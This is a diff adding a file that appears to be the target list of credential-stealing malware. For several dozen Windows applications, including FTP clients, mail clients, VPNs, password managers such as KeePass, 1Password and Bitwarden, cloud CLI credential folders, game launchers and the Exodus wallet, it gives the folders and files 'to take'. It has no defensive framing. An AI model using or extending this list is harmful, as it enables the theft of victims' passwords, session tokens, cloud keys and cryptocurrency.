@@ -1,0 +1,175 @@
+FileZilla
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\FileZilla
+Files to take: SITEMANAGER.XML, RECENTSERVERS.XML, FILEZILLA.XML
+
+Steam
+Folders to take from: C:\Users\%USERNAME%\AppData\Local\Steam, C:\Program Files (x86)\Steam\config
+Files to take: .VDF, .TMP
+
+Microsoft Outlook
+Folders to take from: C:\Users\%USERNAME%\AppData\Local\Microsoft\Outlook
+Files to take: .OST, .PST
+
+Thunderbird
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\Thunderbird\Profiles\*
+Files to take: LOGINS.JSON, KEY4.DB
+
+WinSCP
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\WinSCP
+Files to take: WINSCP.INI, STORED SESSIONS
+
+Cisco AnyConnect VPN
+Folders to take from: C:\ProgramData\Cisco\Cisco AnyConnect Secure Mobility Client\Profile
+Files to take: .XML
+
+OpenVPN
+Folders to take from: %USERPROFILE%\OpenVPN\config, %APPDATA%\OpenVPNConnect
+Files to take: .OVPN, CONFIG.JSON
+
+HeidiSQL
+Folders to take from: %APPDATA%\HeidiSQL
+Files to take: HEIDISQL_SETTINGS.XML, SESSIONS.XML
+
+DBeaver
+Folders to take from: %APPDATA%\DBeaverData\General
+Files to take: .DBEAVER-DATA-SOURCES.XML
+
+Visual Studio Code
+Folders to take from: %APPDATA%\Code\User
+Files to take: SETTINGS.JSON, GLOBALSTORAGE\STATE.VSCDB
+
+Git for Windows
+Folders to take from: %USERPROFILE%\.git-credentials
+Files to take: .GIT-CREDENTIALS
+
+KeePass
+Folders to take from: %USERPROFILE%\Documents
+Files to take: .KDBX
+
+Discord
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\Discord\Local Storage\leveldb
+Files to take: .LDB, .LOG
+
+TeamViewer
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\TeamViewer
+Files to take: CONNECTIONS.XML, TEAMVIEWER.INI
+
+Remote Desktop
+Folders to take from: %USERPROFILE%\Documents
+Files to take: .RDP
+
+Cyberduck
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\Cyberduck
+Files to take: BOOKMARKS.PLIST
+
+7-Zip
+Folders to take from: C:\Users\%USERNAME%\AppData\Roaming\7-Zip
+Files to take: 7ZFM.INI
+
+Norton Password Manager
+Folders to take from: C:\Users\%USERNAME%\AppData\Local\Norton
+Files to take: *
+
+Origin
+Folders to take from: C:\ProgramData\Origin, C:\Users\%USERNAME%\AppData\Local\Origin
+Files to take: *
+
+PrismLauncher
+Folders to take from: %APPDATA%\PrismLauncher
+Files to take: ACCOUNTS.JSON
+
+MultiMC
+Folders to take from: %USERPROFILE%\Desktop\MultiMC, %USERPROFILE%\Downloads\MultiMC
+Files to take: ACCOUNTS.JSON
+
+LunarClient
+Folders to take from: %USERPROFILE%\.lunarclient\settings\game
+Files to take: ACCOUNTS.JSON
+
+Feather
+Folders to take from: %APPDATA%\.feather
+Files to take: ACCOUNTS.JSON
+
+TLauncher
+Folders to take from: %APPDATA%\.minecraft
+Files to take: TLAUNCHERPROFILES.JSON
+
+Essential
+Folders to take from: %APPDATA%\.minecraft\essential
+Files to take: MICROSOFT_ACCOUNTS.JSON
+
+ATLauncher
+Folders to take from: %APPDATA%\ATLauncher\configs
+Files to take: ACCOUNTS.JSON
+
+1Password
+Folders to take from: %LOCALAPPDATA%\1Password
+Files to take: .SQLITE
+
+AnyDesk
+Folders to take from: %APPDATA%\AnyDesk
+Files to take: .CONF
+
+Auto FTP Manager
+Folders to take from: %LOCALAPPDATA%\DeskShareData\AutoFTPManager
+Files to take: AUTOFTPMANAGERSETTINGS.DB
+
+Azure
+Folders to take from: %USERPROFILE%\.azure, %USERPROFILE%\.aws, %APPDATA%\gcloud, %LOCALAPPDATA%\.IdentityService
+Files to take: *, MSAL.CACHE, MSALV2.CACHE, .DB, .JSON
+
+Bitwarden
+Folders to take from: %APPDATA%\Bitwarden
+Files to take: DATA.JSON
+
+FTP Manager Lite
+Folders to take from: %LOCALAPPDATA%\DeskShareData\FTPManagerLite
+Files to take: FTPMANAGERLITESETTINGS.DB
+
+FTPRush
+Folders to take from: %APPDATA%\FTPRush
+Files to take: RUSHSITE.XML
+
+Google Cloud
+Folders to take from: %APPDATA%\gcloud
+Files to take: .DB, .JSON
+
+NordPass
+Folders to take from: %APPDATA%\NordPass
+Files to take: NORDPASS.JSON, NORDPASS.SQLITE
+
+NordVPN
+Folders to take from: %LOCALAPPDATA%\NordVPN
+Files to take: USER.CONFIG
+
+ProtonVPN
+Folders to take from: %LOCALAPPDATA%\ProtonVPN
+Files to take: USER.CONFIG
+
+RealVNC
+Folders to take from: %APPDATA%\RealVNC
+Files to take: *
+
+SmartFTP
+Folders to take from: %APPDATA%\SmartFTP\Client2.0\Favorites
+Files to take: *
+
+TightVNC
+Folders to take from: %APPDATA%\TightVNC
+Files to take: *
+
+TotalCommander
+Folders to take from: %APPDATA%\GHISLER
+Files to take: WCX_FTP.INI
+
+UltraVNC
+Folders to take from: %APPDATA%\UltraVNC
+Files to take: *
+
+Exodus Wallet
+Folders to take from: %APPDATA%\Exodus\exodus.wallet
+Files to take: .SECO, PASSPHRASE.JSON
+
+Riot Games
+Folders to take from: %LOCALAPPDATA%\Riot Games\Riot Client\Data
+Files to take: RIOTGAMESPRIVATESETTINGS.YAML
